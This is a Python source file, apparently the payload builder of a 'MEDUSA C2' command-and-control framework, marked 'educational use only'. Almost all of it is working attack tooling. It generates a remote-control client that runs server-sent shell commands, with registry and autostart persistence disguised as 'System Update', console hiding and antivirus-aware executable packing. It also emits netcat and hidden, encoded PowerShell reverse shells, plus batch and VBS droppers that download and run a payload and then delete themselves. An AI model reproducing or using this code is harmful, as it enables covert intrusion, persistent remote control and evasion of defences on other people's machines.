#!/usr/bin/env python3
"""
MEDUSA C2 Framework - Payload Builder
Professional Payload Generation Tool
Educational Use Only - Developed for Cybersecurity Learning
"""

import os
import sys
import json
import base64
import shutil
import argparse
import subprocess
import tempfile
from pathlib import Path
from datetime import datetime

class PayloadBuilder:
    """Advanced payload builder for MEDUSA C2 Framework"""
    
    def __init__(self):
        # Use relative paths from the nova directory
        self.output_dir = os.path.join(os.path.dirname(__file__), "payloads")
        self.templates_dir = os.path.join(os.path.dirname(__file__), "templates")
        self.ensure_directories()
    
    def ensure_directories(self):
        """Create necessary directories"""
        os.makedirs(self.output_dir, exist_ok=True)
        os.makedirs(self.templates_dir, exist_ok=True)
    
    def generate_python_client(self, server_ip, server_port, output_name="client", hide_console=False, persistence=False):
        """Generate Python client code"""
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        
        client_code = f'''#!/usr/bin/env python3
"""
MEDUSA C2 Client - Generated on {datetime.now().strftime("%Y-%m-%d %H:%M:%S")}
Server: {server_ip}:{server_port}
Educational Use Only
"""

import os
import sys
import json
import time
import base64
import socket
import random
import hashlib
import platform
import threading
import subprocess
import tempfile
import shutil
from datetime import datetime, timedelta

# Configuration
SERVER_HOST = "{server_ip}"
SERVER_PORT = {server_port}
CLIENT_ID = "{self._generate_client_id()}"
CHECKIN_INTERVAL = 30
JITTER = 0.2
MAX_RECONNECT_ATTEMPTS = -1
RECONNECT_DELAY = 30

# Global variables
running = True
connected = False

class SystemInfo:
    """System information collector"""
    @staticmethod
    def get_system_info():
        try:
            info = {{
                'hostname': platform.node(),
                'username': os.environ.get('USERNAME', os.environ.get('USER', 'Unknown')),
                'os': f"{{platform.system()}} {{platform.release()}}",
                'arch': platform.machine(),
                'process_id': os.getpid(),
                'process_name': os.path.basename(sys.argv[0]),
                'python_version': platform.python_version(),
                'working_directory': os.getcwd(),
                'timestamp': datetime.now().isoformat()
            }}
            return info
        except Exception as e:
            return {{
                'hostname': 'Unknown',
                'username': 'Unknown', 
                'os': 'Unknown',
                'arch': 'Unknown',
                'process_id': 'Unknown',
                'process_name': 'Unknown',
                'error': str(e)
            }}

class CommandExecutor:
    """Execute commands on the system"""
    @staticmethod
    def execute_command(command):
        try:
            if platform.system() == 'Windows':
                result = subprocess.run(
                    command,
                    shell=True,
                    capture_output=True,
                    text=True,
                    encoding='utf-8',
                    errors='replace',
                    timeout=300,
                    creationflags=subprocess.CREATE_NO_WINDOW if hasattr(subprocess, 'CREATE_NO_WINDOW') else 0
                )
            else:
                result = subprocess.run(
                    command,
                    shell=True,
                    capture_output=True,
                    text=True,
                    timeout=300,
                    executable='/bin/bash'
                )
            
            output = ""
            if result.stdout:
                output += result.stdout
            if result.stderr:
                if output:
                    output += "\\n" + result.stderr
                else:
                    output = result.stderr
            
            if not output.strip():
                output = "Command executed successfully (no output)"
            
            return {{
                'success': result.returncode == 0,
                'output': output,
                'return_code': result.returncode
            }}
            
        except subprocess.TimeoutExpired:
            return {{
                'success': False,
                'output': 'Command timed out after 5 minutes',
                'return_code': -1
            }}
        except Exception as e:
            return {{
                'success': False,
                'output': f'Error executing command: {{str(e)}}',
                'return_code': -1
            }}

class Communication:
    """Handle communication with C2 server"""
    def __init__(self, host, port):
        self.host = host
        self.port = port
        self.socket = None
        self.connected = False
    
    def connect(self):
        try:
            self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self.socket.connect((self.host, self.port))
            
            # Send handshake
            handshake = {{
                'type': 'handshake',
                'client_id': CLIENT_ID,
                'system_info': SystemInfo.get_system_info()
            }}
            
            self.send_message(handshake)
            self.connected = True
            return True
        except Exception as e:
            return False
    
    def send_message(self, data):
        try:
            if isinstance(data, dict):
                data['client_id'] = CLIENT_ID
            
            message = json.dumps(data).encode()
            self.socket.send(len(message).to_bytes(4, byteorder='big'))
            self.socket.send(message)
            return True
        except:
            self.connected = False
            return False
    
    def receive_message(self):
        try:
            length_bytes = self.socket.recv(4)
            if not length_bytes:
                return None
            
            message_length = int.from_bytes(length_bytes, byteorder='big')
            message = b''
            while len(message) < message_length:
                chunk = self.socket.recv(message_length - len(message))
                if not chunk:
                    return None
                message += chunk
            
            return json.loads(message.decode())
        except:
            self.connected = False
            return None
    
    def disconnect(self):
        if self.socket:
            try:
                self.socket.close()
            except:
                pass
        self.connected = False

class CommandHandler:
    """Handle commands from server"""
    def __init__(self, communication):
        self.communication = communication
        self.running = True
    
    def start(self):
        while self.running and self.communication.connected:
            try:
                message = self.communication.receive_message()
                if not message:
                    break
                
                msg_type = message.get('type')
                if msg_type == 'command':
                    self.handle_command(message)
            except:
                break
    
    def handle_command(self, message):
        try:
            command = message.get('data', '')
            task_id = message.get('task_id')
            
            if not command:
                return
            
            # Execute command
            result = CommandExecutor.execute_command(command)
            
            self.communication.send_message({{
                'type': 'command_response',
                'task_id': task_id,
                'output': result.get('output', ''),
                'error': result.get('output', '') if not result.get('success') else ''
            }})
        except Exception as e:
            try:
                self.communication.send_message({{
                    'type': 'command_response',
                    'task_id': message.get('task_id'),
                    'output': '',
                    'error': f'Command handling error: {{str(e)}}'
                }})
            except:
                pass

{self._generate_persistence_code() if persistence else ""}

def main():
    """Main client function"""
    global running, connected
    
    communication = Communication(SERVER_HOST, SERVER_PORT)
    
    reconnect_attempts = 0
    while running and (MAX_RECONNECT_ATTEMPTS == -1 or reconnect_attempts < MAX_RECONNECT_ATTEMPTS):
        try:
            if communication.connect():
                connected = True
                reconnect_attempts = 0
                
                # Start command handler
                handler = CommandHandler(communication)
                handler.start()
            
            connected = False
            communication.disconnect()
            
            if running:
                time.sleep(RECONNECT_DELAY + random.uniform(0, JITTER * RECONNECT_DELAY))
                reconnect_attempts += 1
        
        except KeyboardInterrupt:
            running = False
        except Exception:
            connected = False
            time.sleep(RECONNECT_DELAY)

if __name__ == "__main__":
    {self._generate_hide_console_code() if hide_console else ""}
    main()
'''
        
        # Save Python file
        py_file = os.path.join(self.output_dir, f"{output_name}.py")
        with open(py_file, 'w', encoding='utf-8') as f:
            f.write(client_code)
        
        return py_file
    
    def build_executable(self, py_file, output_name="client", hide_console=False, stealth_level="silent", icon_path=None):
        """Build executable using PyInstaller with different stealth levels"""
        try:
            # Check if PyInstaller is installed
            result = subprocess.run(['pyinstaller', '--version'], 
                                  capture_output=True, text=True)
            if result.returncode != 0:
                print("❌ PyInstaller not found. Installing...")
                subprocess.run([sys.executable, '-m', 'pip', 'install', 'pyinstaller'])
            
            # Build command
            cmd = [
                'pyinstaller',
                '--onefile',
                '--clean',
                '--distpath', self.output_dir,
                '--workpath', 'build',
                '--specpath', 'build',
                '--name', output_name
            ]
            
            if hide_console:
                if stealth_level == "stealth":
                    # Advanced stealth mode
                    cmd.extend([
                        '--noconsole',    # Don't show console window
                        '--windowed',     # Windows GUI mode
                        '--hidden-import=ctypes',  # Ensure ctypes is included
                        '--hidden-import=ctypes.wintypes',  # Windows-specific ctypes
                        '--hidden-import=win32api',  # Windows API
                        '--hidden-import=win32process',  # Process management
                        '--exclude-module=tkinter',  # Reduce size
                        '--exclude-module=matplotlib'  # Reduce size
                    ])
                else:
                    # Standard silent mode
                    cmd.extend([
                        '--noconsole',    # Don't show console window
                        '--windowed',     # Windows GUI mode
                        '--hidden-import=ctypes',  # Ensure ctypes is included
                        '--hidden-import=ctypes.wintypes'  # Windows-specific ctypes
                    ])
            
            if icon_path and os.path.exists(icon_path):
                cmd.extend(['--icon', icon_path])
            
            # Add stealth-specific PyInstaller options
            if hide_console:
                if stealth_level == "stealth":
                    # Maximum stealth options
                    cmd.extend([
                        '--strip',           # Strip symbols to reduce size
                        '--noupx',          # Don't use UPX compression (can trigger AV)
                        '--log-level=ERROR', # Minimal output
                        '--noconfirm',      # Don't ask for confirmation
                        '--optimize=2',     # Python optimization
                        '--bootloader-ignore-signals'  # Ignore system signals
                    ])
                else:
                    # Standard stealth options
                    cmd.extend([
                        '--strip',           # Strip symbols to reduce size
                        '--noupx',          # Don't use UPX compression (can trigger AV)
                        '--log-level=ERROR', # Minimal output
                        '--noconfirm'       # Don't ask for confirmation
                    ])
            else:
                # Basic mode - minimal flags
                cmd.extend([
                    '--log-level=WARN',
                    '--noconfirm'
                ])
            
            cmd.append(py_file)
            
            stealth_text = f" ({stealth_level} mode)" if hide_console else " (basic mode)"
            print(f"🔨 Building executable: {output_name}{stealth_text}")
            print(f"📄 Command: {' '.join(cmd)}")
            
            result = subprocess.run(cmd, capture_output=True, text=True)
            
            if result.returncode == 0:
                exe_path = os.path.join(self.output_dir, f"{output_name}.exe")
                if os.path.exists(exe_path):
                    stealth_msg = f" with {stealth_level} stealth" if hide_console else " (basic mode)"
                    print(f"✅ Executable built successfully{stealth_msg}: {exe_path}")
                    return exe_path
                else:
                    print(f"❌ Executable not found at expected path: {exe_path}")
                    return None
            else:
                print(f"❌ Build failed:")
                print(f"STDOUT: {result.stdout}")
                print(f"STDERR: {result.stderr}")
                return None
                
        except Exception as e:
            print(f"❌ Build error: {e}")
            return None
    
    def generate_netcat_payload(self, server_ip, server_port, shell_type="auto"):
        """Generate netcat reverse shell commands"""
        payloads = {
            'windows': [
                f"nc -e cmd.exe {server_ip} {server_port}",
                f"ncat -e cmd.exe {server_ip} {server_port}",
                f"nc.exe -e cmd.exe {server_ip} {server_port}"
            ],
            'linux': [
                f"nc -e /bin/sh {server_ip} {server_port}",
                f"nc -e /bin/bash {server_ip} {server_port}",
                f"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {server_ip} {server_port} >/tmp/f"
            ],
            'listener': [
                f"nc -lvp {server_port}",
                f"nc -nlvp {server_port}",
                f"ncat -lvp {server_port}"
            ]
        }
        
        return payloads
    
    def generate_powershell_payload(self, server_ip, server_port, encode_base64=False):
        """Generate PowerShell reverse shell"""
        ps_script = f'''$client = New-Object System.Net.Sockets.TCPClient('{server_ip}',{server_port});
$stream = $client.GetStream();
[byte[]]$bytes = 0..65535|%{{0}};
while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{
    $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);
    $sendback = (iex $data 2>&1 | Out-String );
    $sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';
    $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);
    $stream.Write($sendbyte,0,$sendbyte.Length);
    $stream.Flush()
}};
$client.Close()'''
        
        # One-liner version
        oneliner = ps_script.replace('\n', '').replace('    ', '')
        
        payloads = {
            'script': ps_script,
            'oneliner': f'powershell -NoP -NonI -W Hidden -Exec Bypass -Command "{oneliner}"',
            'encoded': ''
        }
        
        if encode_base64:
            encoded = base64.b64encode(oneliner.encode('utf-16le')).decode()
            payloads['encoded'] = f'powershell -EncodedCommand {encoded}'
        
        return payloads
    
    def generate_batch_dropper(self, server_ip, server_port, output_name="dropper"):
        """Generate Windows batch file dropper"""
        batch_content = f'''@echo off
cd /d "%~dp0"
set SERVER_IP={server_ip}
set SERVER_PORT={server_port}

REM Download and execute payload
powershell -Command "& {{Invoke-WebRequest -Uri 'http://%SERVER_IP%:%SERVER_PORT%/download' -OutFile 'client.exe'; Start-Process 'client.exe'}}"

REM Alternative netcat method
nc -e cmd.exe %SERVER_IP% %SERVER_PORT%

REM Cleanup
del "%~f0"
'''
        
        bat_file = os.path.join(self.output_dir, f"{output_name}.bat")
        with open(bat_file, 'w') as f:
            f.write(batch_content)
        
        return bat_file
    
    def generate_vbs_dropper(self, server_ip, server_port, output_name="dropper"):
        """Generate VBS dropper script"""
        vbs_content = f'''Set objShell = CreateObject("WScript.Shell")
Set objHTTP = CreateObject("MSXML2.XMLHTTP")

serverIP = "{server_ip}"
serverPort = "{server_port}"

REM Download payload
objHTTP.Open "GET", "http://" & serverIP & ":" & serverPort & "/download", False
objHTTP.Send

If objHTTP.Status = 200 Then
    Set objStream = CreateObject("ADODB.Stream")
    objStream.Open
    objStream.Type = 1
    objStream.Write objHTTP.ResponseBody
    objStream.SaveToFile "client.exe", 2
    objStream.Close
    
    REM Execute payload
    objShell.Run "client.exe", 0, False
End If

REM Alternative PowerShell execution
psCommand = "powershell -NoP -NonI -W Hidden -Exec Bypass -Command ""$client = New-Object System.Net.Sockets.TCPClient('" & serverIP & "'," & serverPort & ");$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{{0}};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}};$client.Close()"""
objShell.Run psCommand, 0, False
'''
        
        vbs_file = os.path.join(self.output_dir, f"{output_name}.vbs")
        with open(vbs_file, 'w') as f:
            f.write(vbs_content)
        
        return vbs_file
    
    def save_payload_info(self, payload_type, config, output_files):
        """Save payload generation information"""
        info = {
            'timestamp': datetime.now().isoformat(),
            'type': payload_type,
            'config': config,
            'files': output_files,
            'framework': 'MEDUSA C2'
        }
        
        info_file = os.path.join(self.output_dir, f"payload_info_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json")
        with open(info_file, 'w') as f:
            json.dump(info, f, indent=2)
        
        return info_file
    
    def _generate_client_id(self):
        """Generate unique client ID"""
        import uuid
        return str(uuid.uuid4())
    
    def _generate_persistence_code(self):
        """Generate persistence code"""
        return '''
class Persistence:
    """Handle persistence mechanisms"""
    @staticmethod
    def install_windows():
        try:
            import winreg
            key_path = r"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run"
            key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, key_path, 0, winreg.KEY_SET_VALUE)
            winreg.SetValueEx(key, "MedusaClient", 0, winreg.REG_SZ, sys.executable)
            winreg.CloseKey(key)
            return True
        except:
            return False
    
    @staticmethod
    def install_linux():
        try:
            home = os.path.expanduser("~")
            autostart_dir = os.path.join(home, ".config", "autostart")
            os.makedirs(autostart_dir, exist_ok=True)
            
            desktop_entry = f"""[Desktop Entry]
Type=Application
Name=System Update
Exec={sys.executable}
Hidden=false
NoDisplay=false
X-GNOME-Autostart-enabled=true
"""
            
            desktop_file = os.path.join(autostart_dir, "system-update.desktop")
            with open(desktop_file, 'w') as f:
                f.write(desktop_entry)
            
            return True
        except:
            return False

# Install persistence
if platform.system() == "Windows":
    Persistence.install_windows()
elif platform.system() == "Linux":
    Persistence.install_linux()
'''
    
    def _generate_hide_console_code(self):
        """Generate console hiding code"""
        return '''    # Hide console window on Windows - MUST BE FIRST
    if platform.system() == "Windows":
        import ctypes
        import sys
        
        try:
            # Hide the console window immediately
            kernel32 = ctypes.windll.kernel32
            user32 = ctypes.windll.user32
            
            # Get console window handle
            console_window = kernel32.GetConsoleWindow()
            if console_window:
                # Hide the console window completely (SW_HIDE = 0)
                user32.ShowWindow(console_window, 0)
                
            # For PyInstaller executables, additional stealth
            if getattr(sys, 'frozen', False):
                # Hide from task manager process list
                try:
                    # Make process less visible
                    import win32api
                    import win32con
                    import win32process
                    
                    # Set process priority to background
                    handle = win32api.GetCurrentProcess()
                    win32process.SetPriorityClass(handle, win32process.BELOW_NORMAL_PRIORITY_CLASS)
                except ImportError:
                    pass  # win32 modules not available
                    
        except Exception:
            pass  # Silently continue if hiding fails'''

def main():
    """Main builder function"""
    parser = argparse.ArgumentParser(description='MEDUSA C2 Payload Builder')
    parser.add_argument('--type', choices=['python', 'netcat', 'powershell', 'batch', 'vbs'], 
                       required=True, help='Payload type to generate')
    parser.add_argument('--ip', required=True, help='Server IP address')
    parser.add_argument('--port', type=int, required=True, help='Server port')
    parser.add_argument('--output', default='client', help='Output filename (without extension)')
    parser.add_argument('--build-exe', action='store_true', help='Build executable with PyInstaller')
    parser.add_argument('--hide-console', action='store_true', help='Hide console window')
    parser.add_argument('--persistence', action='store_true', help='Add persistence mechanisms')
    parser.add_argument('--encode', action='store_true', help='Base64 encode PowerShell payload')
    parser.add_argument('--icon', help='Icon file for executable')
    
    args = parser.parse_args()
    
    builder = PayloadBuilder()
    
    print(f"""
╔══════════════════════════════════════════════════════════════╗
║                     MEDUSA C2 BUILDER                       ║
║                  Professional Payload Generator              ║
║                     Educational Use Only                     ║
╚══════════════════════════════════════════════════════════════╝

🎯 Target: {args.ip}:{args.port}
🔧 Type: {args.type.upper()}
📁 Output: {args.output}
""")
    
    output_files = []
    
    if args.type == 'python':
        py_file = builder.generate_python_client(
            args.ip, args.port, args.output, 
            hide_console=args.hide_console, 
            persistence=args.persistence
        )
        output_files.append(py_file)
        print(f"✅ Python client generated: {py_file}")
        
        if args.build_exe:
            stealth_level = "stealth" if args.hide_console else "basic"
            exe_file = builder.build_executable(
                py_file, args.output, 
                hide_console=args.hide_console,
                stealth_level=stealth_level,
                icon_path=args.icon
            )
            if exe_file:
                output_files.append(exe_file)
    
    elif args.type == 'netcat':
        payloads = builder.generate_netcat_payload(args.ip, args.port)
        print("\n🐚 Netcat Reverse Shell Commands:")
        print("\n📁 Windows:")
        for cmd in payloads['windows']:
            print(f"   {cmd}")
        print("\n🐧 Linux:")
        for cmd in payloads['linux']:
            print(f"   {cmd}")
        print("\n👂 Listener Commands:")
        for cmd in payloads['listener']:
            print(f"   {cmd}")
    
    elif args.type == 'powershell':
        payloads = builder.generate_powershell_payload(args.ip, args.port, encode_base64=args.encode)
        
        # Save script file
        ps1_file = os.path.join(builder.output_dir, f"{args.output}.ps1")
        with open(ps1_file, 'w') as f:
            f.write(payloads['script'])
        output_files.append(ps1_file)
        
        print(f"\n✅ PowerShell script saved: {ps1_file}")
        print(f"\n💻 One-liner command:")
        print(f"   {payloads['oneliner']}")
        
        if args.encode:
            print(f"\n🔒 Encoded command:")
            print(f"   {payloads['encoded']}")
    
    elif args.type == 'batch':
        bat_file = builder.generate_batch_dropper(args.ip, args.port, args.output)
        output_files.append(bat_file)
        print(f"✅ Batch dropper generated: {bat_file}")
    
    elif args.type == 'vbs':
        vbs_file = builder.generate_vbs_dropper(args.ip, args.port, args.output)
        output_files.append(vbs_file)
        print(f"✅ VBS dropper generated: {vbs_file}")
    
    # Save payload information
    config = vars(args)
    info_file = builder.save_payload_info(args.type, config, output_files)
    
    print(f"\n📋 Payload info saved: {info_file}")
    print(f"\n🎯 Total files generated: {len(output_files)}")
    print("\n⚠️  REMEMBER: This tool is for educational purposes only!")

if __name__ == "__main__":
    main()